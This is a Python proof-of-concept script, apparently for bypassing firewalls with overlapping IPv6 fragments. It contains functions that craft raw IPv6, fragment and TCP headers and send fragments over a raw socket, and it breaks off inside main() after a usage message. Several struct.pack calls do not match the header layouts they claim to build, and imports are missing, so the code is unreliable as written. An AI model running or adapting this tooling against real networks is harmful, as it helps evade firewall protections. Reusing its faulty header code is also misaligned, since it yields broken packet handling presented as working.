def calculate_checksum(header_bytes):
    """Calculate the pseudo-header checksum for IPv6."""
    if len(header_bytes) % 2 != 0:
        header_bytes += b'\x00'
    total = 0
    for i in range(0, len(header_bytes), 2):
        word = (header_bytes[i] << 8) + header_bytes[i+1]
        total += word
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF

def build_ipv6_header(src, dst, payload_len, next_header, hop_limit=64):
    """Construct an IPv6 header."""
    version_traffic_class_flow_label = (6 << 28) | (0 << 20) | 0
    header = struct.pack('!IIHHBBH',
        version_traffic_class_flow_label,
        payload_len,
        next_header,
        hop_limit,
        0, 0, 0, 0  # Placeholder for src/dst, will be replaced
    )
    # IPv6 addresses are 128 bits (16 bytes)
    src_bytes = socket.inet_pton(socket.AF_INET6, src)
    dst_bytes = socket.inet_pton(socket.AF_INET6, dst)
    return header[:8] + src_bytes + dst_bytes + header[24:]

def build_fragment_header(next_header, frag_offset, more_fragments, identification):
    """Construct an IPv6 Fragment Extension Header."""
    # Fragment Offset is in 8-octet units
    frag_offset_val = frag_offset << 3
    res_m = (0 << 1) | (1 if more_fragments else 0)
    header = struct.pack('!BBHI',
        next_header,
        res_m,
        frag_offset_val,
        identification
    )
    return header

def build_tcp_header(src_port, dst_port, seq, ack, flags, window=65535):
    """Construct a TCP header."""
    data_offset = 5 << 4  # 5 words (20 bytes)
    header = struct.pack('!HHIIBBHHH',
        src_port, dst_port,
        seq, ack,
        data_offset, flags,
        window, 0, 0  # Checksum, Urgent pointer
    )
    return header

def send_fragment(sock, src, dst, frag_header, payload, identification):
    """Send a single IPv6 fragment."""
    # Calculate payload length for IPv6 header
    payload_len = len(frag_header) + len(payload)
    ipv6_header = build_ipv6_header(src, dst, payload_len, 44) # 44 is Fragment Header
    packet = ipv6_header + frag_header + payload
    sock.sendto(packet, (dst, 0))
    print(f"Sent fragment: ID={identification}, Offset={frag_header[2:4].hex()}, Payload Len={len(payload)}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 poc_ipv6_overlapping_fragment_firewall_bypass.py <target_ipv6> <dst_port>")
